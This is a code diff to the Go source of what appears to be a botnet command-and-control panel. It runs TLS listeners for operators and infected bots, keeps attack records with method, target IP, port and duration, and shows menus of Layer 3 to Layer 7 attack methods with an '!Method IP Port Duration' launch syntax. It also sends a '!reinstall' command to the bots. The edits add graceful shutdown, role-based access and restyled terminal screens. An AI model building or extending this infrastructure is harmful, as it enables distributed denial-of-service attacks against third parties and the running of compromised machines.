@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"context"
 	"crypto/tls"
 	"encoding/binary"
 	"encoding/json"
@@ -9,10 +10,12 @@ import (
 	"io"
 	"net"
 	"os"
+	"os/signal"
 	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
+	"syscall"
 	"time"
 )
 
@@ -45,7 +48,7 @@ type client struct {
 	sessionID    string // Add this field
 }
 
-type attack struct {
+type Attack struct { // Capitalize to export
 	method   string
 	ip       string
 	port     string
@@ -55,10 +58,10 @@ type attack struct {
 }
 
 var (
-	ongoingAttacks    = make(map[net.Conn]attack)
-	ongoingAPIAttacks = make(map[string]attack)
+	ongoingAttacks    = make(map[net.Conn]Attack)
+	ongoingAPIAttacks = make(map[string]Attack)
 	apiAttackLock     sync.Mutex
-	attackHistory     []attack
+	attackHistory     []Attack
 	clients           = []*client{}
 	attackLock        sync.Mutex
 	historyLock       sync.Mutex
@@ -66,9 +69,63 @@ var (
 	botCount          int
 )
 
+func initializeComponents() error {
+	if err := initSessionManagement(); err != nil {
+		return fmt.Errorf("session management: %w", err)
+	}
+
+	if err := InitLogger("data/logs"); err != nil {
+		return fmt.Errorf("logger: %w", err)
+	}
+
+	if err := LoadRBACConfig(); err != nil {
+		return fmt.Errorf("RBAC: %w", err)
+	}
+
+	InitRateLimiter()
+	return nil
+}
+
 func main() {
 	os.Setenv("LANG", "en_US.UTF-8")
+
+	// Set up signal handling for graceful shutdown
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT)
+
+	// Goroutine to handle graceful shutdown
+	go func() {
+		sig := <-sigChan
+		fmt.Printf("\nReceived signal: %v. Shutting down gracefully...\n", sig)
+
+		// Close all connections in the pool
+		connectionPool.CloseAll()
+
+		// Close the global logger if it exists
+		if globalLogger != nil {
+			globalLogger.Close()
+		}
+
+		// Close API server if it's running
+		if apiServer != nil && apiServer.started {
+			// Create a simple shutdown context
+			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+			defer cancel()
+
+			// Gracefully shutdown the HTTP server
+			if err := apiServer.server.Shutdown(ctx); err != nil {
+				fmt.Printf("Error shutting down API server: %v\n", err)
+			}
+			apiServer.started = false
+			fmt.Println("[API] Server stopped")
+		}
+
+		fmt.Println("Shutdown complete.")
+		os.Exit(0)
+	}()
+
 	if _, err := os.ReadFile("data/json/users.json"); err != nil {
+		// File doesn't exist or can't be read, continue without users file
 	}
 	cert, err := tls.LoadX509KeyPair(CERT_FILE, KEY_FILE)
 	if err != nil {
@@ -113,12 +170,17 @@ func main() {
 	go CleanupQuotas()
 	go CleanupAuthAttempts()
 	go CleanupConnectionCounts()
+	go initializeComponents()
 	connectionPool.StartCleanupRoutine(1 * time.Minute)
 
-	apiServer = NewAPIServer("8080")
+	apiServer = NewAPIServer("8443")
 	if err := apiServer.Start(); err != nil {
 		fmt.Printf("Error starting API server: %v\n", err)
 	}
+
+	// Ensure connection pool is closed on normal exit too
+	defer connectionPool.CloseAll()
+
 	fmt.Println("[☾☼☽] User server started on", USER_SERVER_IP+":"+USER_SERVER_PORT)
 	userListener, err := tls.Listen("tcp", USER_SERVER_IP+":"+USER_SERVER_PORT, tlsConfig)
 	if err != nil {
@@ -126,6 +188,7 @@ func main() {
 		return
 	}
 	defer userListener.Close()
+
 	fmt.Println("[☾☼☽] Bot server started on", BOT_SERVER_IP+":"+BOT_SERVER_PORT)
 	botListener, err := tls.Listen("tcp", BOT_SERVER_IP+":"+BOT_SERVER_PORT, tlsConfig)
 	if err != nil {
@@ -133,34 +196,90 @@ func main() {
 		return
 	}
 	defer botListener.Close()
+
+	// Use WaitGroup to manage goroutines
+	var wg sync.WaitGroup
+	stopChan := make(chan struct{})
+
+	// User connection handler goroutine
+	wg.Add(1)
 	go func() {
+		defer wg.Done()
 		for {
-			conn, err := userListener.Accept()
-			if err != nil {
-				fmt.Println("Error accepting user connection:", err)
-				continue
+			select {
+			case <-stopChan:
+				return
+			default:
+				conn, err := userListener.Accept()
+				if err != nil {
+					select {
+					case <-stopChan:
+						return
+					default:
+						fmt.Println("Error accepting user connection:", err)
+						continue
+					}
+				}
+				fmt.Println("[☾☼☽] [User] Connected To Login Port:", conn.RemoteAddr())
+				go handleRequest(conn.(*tls.Conn))
 			}
-			fmt.Println("[☾☼☽] [User] Connected To Login Port:", conn.RemoteAddr())
-			go handleRequest(conn.(*tls.Conn))
 		}
 	}()
-	for {
-		conn, err := botListener.Accept()
-		if err != nil {
-			fmt.Println("Error accepting bot connection:", err)
-			continue
-		}
-		tlsConn := conn.(*tls.Conn)
 
-		if err := connectionPool.Put(tlsConn.RemoteAddr().String(), tlsConn); err != nil {
-			fmt.Printf("Connection pool full, rejecting bot: %v\n", err)
-			tlsConn.Close()
-			continue
-		}
+	// Bot connection handler goroutine
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		for {
+			select {
+			case <-stopChan:
+				return
+			default:
+				conn, err := botListener.Accept()
+				if err != nil {
+					select {
+					case <-stopChan:
+						return
+					default:
+						fmt.Println("Error accepting bot connection:", err)
+						continue
+					}
+				}
+				tlsConn := conn.(*tls.Conn)
 
-		fmt.Println("[вҳҫвҳјвҳҪ] Bot connected From", conn.RemoteAddr())
-		go handleBotConnection(tlsConn)
+				if err := connectionPool.Put(tlsConn.RemoteAddr().String(), tlsConn); err != nil {
+					fmt.Printf("Connection pool full, rejecting bot: %v\n", err)
+					tlsConn.Close()
+					continue
+				}
+
+				fmt.Println("[☾☼☽] Bot connected From", conn.RemoteAddr())
+				go handleBotConnection(tlsConn)
+			}
+		}
+	}()
+
+	// Wait for shutdown signal
+	<-sigChan
+	fmt.Println("\nShutting down servers...")
+
+	// Signal all goroutines to stop
+	close(stopChan)
+
+	// Close listeners to unblock Accept() calls
+	userListener.Close()
+	botListener.Close()
+
+	// Wait for all goroutines to finish
+	wg.Wait()
+
+	// Final cleanup
+	connectionPool.CloseAll()
+	if globalLogger != nil {
+		globalLogger.Close()
 	}
+
+	fmt.Println("Server shutdown completed.")
 }
 
 func removeBotConn(conn *tls.Conn) {
@@ -456,9 +575,9 @@ func handleRequest(conn *tls.Conn) {
 			FadeText(fmt.Sprintf("\033[0mWelcome %s! Type 'help' for commands.", client.user.Username), conn)
 			conn.Write([]byte("\r\n"))
 			conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
-			conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mUser Menu\x1b[38;5;231m §                  ║                              ║\n\r"))
-			conn.Write([]byte("\x1b[38;5;231m╠════════════════════╦══════════════════════════╢                              ║\n\r"))
-			conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;41mBasic Commands   \x1b[38;5;231m║  \x1b[38;5;41mOverview + Description  \x1b[38;5;231m║                              ║\n\r"))
+			conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mUser Menu\x1b[38;5;231m §                  ║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r"))
+			conn.Write([]byte("\x1b[38;5;231m╠════════════════════╦══════════════════════════╢  │    │    │    │    │    │  ║\n\r"))
+			conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;41mBasic Commands   \x1b[38;5;231m║  \x1b[38;5;41mOverview + Description  \x1b[38;5;231m║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r"))
 			conn.Write([]byte("\x1b[38;5;231m╠════════════════════╬══════════════════════════╬══════════════════════════════╣\n\r"))
 			conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. bots          \x1b[38;5;231m║ Manage connected bots    ║ ╔══════════════════════════╗ ║\n\r"))
 			conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. clear         \x1b[38;5;231m║ Clear the screen         ║ ║ L7: HTTP/HTTPS/TLS/SSL   ║ ║\n\r"))
@@ -549,7 +668,7 @@ func handleRequest(conn *tls.Conn) {
 					conn.Write([]byte(fmt.Sprintf("method: %s\r\n", method)))
 					conn.Write([]byte("\r\n"))
 					attackLock.Lock()
-					ongoingAttacks[conn] = attack{
+					ongoingAttacks[conn] = Attack{
 						method:   method,
 						ip:       ip,
 						port:     port,
@@ -561,7 +680,7 @@ func handleRequest(conn *tls.Conn) {
 					historyLock.Lock()
 					attackHistory = append(attackHistory, ongoingAttacks[conn])
 					historyLock.Unlock()
-					go func(conn net.Conn, attack attack) {
+					go func(conn net.Conn, attack Attack) {
 						ShowProgressBar(conn, attack.duration, "Attack Progress")
 						attackLock.Lock()
 						delete(ongoingAttacks, conn)
@@ -692,29 +811,123 @@ func handleRequest(conn *tls.Conn) {
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║                                 \x1b[38;5;51mBot Status\x1b[38;5;231m                                   ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║ Connected Clients: \x1b[38;5;82m%-52d\x1b[38;5;231m      ║\n\r", count)))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║               § \x1b[38;5;51mBot Network Status\x1b[38;5;231m §          ║  ●━━━━━━━━━━━━━━━━━━━━━━━●   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   │                    │     ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Live Connection Statistics\x1b[38;5;231m                  ║  ░░ BOT NETWORK ACTIVE ░░    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Connected Clients: \x1b[38;5;82m%-23d\x1b[38;5;231m║ ╭══════════════════════════╮ ║\r\n", count)))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Status:          \x1b[38;5;82mLIVE & ACTIVE\x1b[38;5;231m            ║ ║   [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]   ║ ║\r\n"))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Last Update:    \x1b[38;5;82m%-26s\x1b[38;5;231m║ ╰          ONLINE          ╯ ║\r\n", time.Now().Format("15:04:05"))))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║              \x1b[38;5;51mAll systems operational and ready\x1b[38;5;231m                               ║\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
+
 				case "clear":
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║                                 \x1b[38;5;51mClearing \x1b[38;5;231m                                    ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║ Session Cleared. The screen has been refreshed.			       ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║ Type   \x1b[38;5;51mHelp   \x1b[0m to see available commands.	                              	║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mScreen Cleared\x1b[38;5;231m §             ║    ┌────────────────────┐    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │    TERMINAL RESET  │    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Session Management\x1b[38;5;231m                          ║    │     COMPLETE       │    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    └────────────────────┘    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;82mSCREEN REFRESHED\x1b[38;5;231m               ║    ░░░░░░░░░░░░░░░░░░░░░░    ║\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Action:    \x1b[38;5;82mTERMINAL CLEARED\x1b[38;5;231m               ║     ────────────────────     ║\r\n"))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Time:      \x1b[38;5;82m%-26s\x1b[38;5;231m     ║     ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒     ║\r\n", time.Now().Format("15:04:05"))))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Next Steps\x1b[38;5;231m                                  ║    ┌────────────────────┐    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │   TYPE 'HELP' FOR  │    ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Type \x1b[38;5;51m'help'\x1b[38;5;231m to see available commands     ║    │     COMMAND LIST   │    ║\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Session is ready for new commands         ║    └────────────────────┘    ║\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\n\r"))
+
 				case "logout", "exit":
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-					conn.Write([]byte("Session Ended\r\n"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║               § \x1b[38;5;51mSession Termination\x1b[38;5;231m §             ║   ┌────────────────────┐   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   │   LOGGING OUT...   │   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Connection Closure\x1b[38;5;231m                          ║   │     GOODBYE!       │   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   └────────────────────┘   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mSESSION ENDING\x1b[38;5;231m                   ║   ░░░░░░░░░░░░░░░░░░░░░░   ║\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Action:    \x1b[38;5;196mCONNECTION CLOSE\x1b[38;5;231m                 ║   ────────────────────   ║\r\n"))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Time:      \x1b[38;5;196m%-26s\x1b[38;5;231m   ║   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║\r\n", time.Now().Format("15:04:05"))))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║              \x1b[38;5;51mThank you for using our services!\x1b[38;5;231m              ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
+					time.Sleep(2 * time.Second)
 					conn.Write([]byte("\x1b[38;5;196mLogging out...\x1b[0m\r\nGoodbye, see you soon!\r\n"))
 					conn.Close()
-					return
+				case "help":
+					conn.Write([]byte("\033[2J\033[H"))
+					conn.Write([]byte("\033[3J\033[H\033[2J"))
+					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mUser Menu\x1b[38;5;231m §                  ║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╦══════════════════════════╢  │    │    │    │    │    │  ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;41mBasic Commands   \x1b[38;5;231m║  \x1b[38;5;41mOverview + Description  \x1b[38;5;231m║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╬══════════════════════════╬══════════════════════════════╣\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. bots          \x1b[38;5;231m║ Manage connected bots    ║ ╔══════════════════════════╗ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. clear         \x1b[38;5;231m║ Clear the screen         ║ ║ L7: HTTP/HTTPS/TLS/SSL   ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. help          \x1b[38;5;231m║ Show this help menu      ║ ║ L6: COMPRESSION/ENCRYPT  ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. methods       \x1b[38;5;231m║ Show attack methods      ║ ║ L5: SESSION/RPC/NETBIOS  ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. ongoing       \x1b[38;5;231m║ List ongoing attacks     ║ ║ L4: TCP/UDP/SCTP/PORTS   ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╩══════════════════════════╢ ║ L3: IP/ICMP/ARP/ROUTING  ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mAttack Menu\x1b[38;5;231m §                ║ ╚══════════════════════════╝ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╦══════════════════════════╬══════════════════════════════╢\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║\x1b[38;5;50m◉ Attack Commands ◉\x1b[38;5;231m ║  \x1b[38;5;50mOverview + Description  \x1b[38;5;231m║ ╔══════════════════════════╗ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╬══════════════════════════║ ║ [1][2][3][4][5][6][7][8] ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. allattacks    \x1b[38;5;231m║ Show all attacks         ║ ║  ●  ●  ○  ●  ○  ●  ○  ●  ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. stopattack    \x1b[38;5;231m║ Stop a running attack    ║ ║      24-PORT SWITCH      ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. attackhistory \x1b[38;5;231m║ View attack history      ║ ╚══════════════════════════╝ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╩═════════════════╦════════╩══════════════════════════════╣\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║  \x1b[38;5;45mEg.. !Method IP Port Duration ⚑ \x1b[38;5;231m    ║          ⚔ Attack Example ⚔           ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════╩═══════════════════════════════════════╯\n\r"))
+				case "admin":
+					if client.user.GetLevel() > Admin {
+						writeError(conn, "Insufficient permissions.")
+						continue
+					}
+					conn.Write([]byte("\033[2J\033[H"))
+					conn.Write([]byte("\033[3J\033[H\033[2J"))
+					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
+					conn.Write([]byte("\033[2J\033[H"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║                                 \x1b[38;5;51mAdmin Menu\x1b[38;5;231m                                   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m1. adduser      \x1b[38;5;231m║ Add a new user          ║                                ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m2. deluser      \x1b[38;5;231m║ Delete a user           ║                                ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m3. users        \x1b[38;5;231m║ List all users          ║                                ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m4. rbac         \x1b[38;5;231m║ Manage RBAC permissions ║                                ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m5. botstatus    \x1b[38;5;231m║ Show bot status details ║                                ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════╩═══════════════════════════════╯\n\r"))
+				case "owner":
+					if client.user.GetLevel() > Owner {
+						writeError(conn, "Logged and Reported.")
+						continue
+					}
+					conn.Write([]byte("\033[2J\033[H"))
+					conn.Write([]byte("\033[3J\033[H\033[2J"))
+					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
+					conn.Write([]byte("\033[2J\033[H"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║                               \x1b[38;5;51mHello Master\x1b[38;5;231m                                   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m1. gif          \x1b[38;5;231m║ Add a new user          ║                                ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m2. deluser      \x1b[38;5;231m║ Delete a user           ║                                ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m4. rbac         \x1b[38;5;231m║ Manage RBAC permissions ║                                ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m5. session      \x1b[38;5;231m║ Show users sessions+Kill║                                ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════╩═══════════════════════════════╯\n\r"))
 				case "!reinstall":
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
@@ -736,73 +949,6 @@ func handleRequest(conn *tls.Conn) {
 					copy(reinstallPacket.Method[:], "!reinstall")
 					sendToBots(reinstallPacket)
 					SuccessAnimation.Play(conn, 1*time.Second, "Reinstall command sent!")
-				case "help":
-					conn.Write([]byte("\033[2J\033[H"))
-					conn.Write([]byte("\033[3J\033[H\033[2J"))
-					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-					conn.Write([]byte("\r\n"))
-					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mUser Menu\x1b[38;5;231m §                  ║                              ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╦══════════════════════════╢                              ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;41mBasic Commands   \x1b[38;5;231m║  \x1b[38;5;41mOverview + Description  \x1b[38;5;231m║                              ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╬══════════════════════════╬══════════════════════════════╣\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. bots          \x1b[38;5;231m║ Manage connected bots    ║ ╔══════════════════════════╗ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. clear         \x1b[38;5;231m║ Clear the screen         ║ ║ L7: HTTP/HTTPS/TLS/SSL   ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. help          \x1b[38;5;231m║ Show this help menu      ║ ║ L6: COMPRESSION/ENCRYPT  ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. methods       \x1b[38;5;231m║ Show attack methods      ║ ║ L5: SESSION/RPC/NETBIOS  ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. ongoing       \x1b[38;5;231m║ List ongoing attacks     ║ ║ L4: TCP/UDP/SCTP/PORTS   ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╩══════════════════════════╢ ║ L3: IP/ICMP/ARP/ROUTING  ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mAttack Menu\x1b[38;5;231m §                ║ ╚══════════════════════════╝ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╦══════════════════════════╬══════════════════════════════╢\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║\x1b[38;5;50m◉ Attack Commands ◉\x1b[38;5;231m ║  \x1b[38;5;50mOverview + Description  \x1b[38;5;231m║ ╔══════════════════════════╗ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╬══════════════════════════║ ║ [1][2][3][4][5][6][7][8] ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. allattacks    \x1b[38;5;231m║ Show all attacks         ║ ║  ●  ●  ○  ●  ○  ●  ○  ●  ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. stopattack    \x1b[38;5;231m║ Stop a running attack    ║ ║      24-PORT SWITCH      ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. attackhistory \x1b[38;5;231m║ View attack history      ║ ╚══════════════════════════╝ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╩═════════════════╦════════╩══════════════════════════════╣\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║  \x1b[38;5;45mEg.. !Method IP Port Duration ⚑ \x1b[38;5;231m    ║          ⚔ Attack Example ⚔           ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════╩═══════════════════════════════════════╯\n\r"))
-
-				case "admin":
-					if client.user.GetLevel() > Admin {
-						writeError(conn, "Insufficient permissions.")
-						continue
-					}
-					conn.Write([]byte("\033[2J\033[H"))
-					conn.Write([]byte("\033[3J\033[H\033[2J"))
-					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-					conn.Write([]byte("\033[2J\033[H"))
-					conn.Write([]byte("\r\n"))
-					conn.Write([]byte("\r\n"))
-					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║                                 \x1b[38;5;51mAdmin Menu\x1b[38;5;231m                                   ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m1. adduser      \x1b[38;5;231m║ Add a new user          ║                                ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m2. deluser      \x1b[38;5;231m║ Delete a user           ║                                ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m3. users        \x1b[38;5;231m║ List all users          ║                                ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m4. rbac         \x1b[38;5;231m║ Manage RBAC permissions ║                                ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m5. botstatus    \x1b[38;5;231m║ Show bot status details ║                                ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════╩═══════════════════════════════╯\n\r"))
-
-				case "owner":
-					if client.user.GetLevel() > Owner {
-						writeError(conn, "Logged and Reported.")
-						continue
-					}
-					conn.Write([]byte("\033[2J\033[H"))
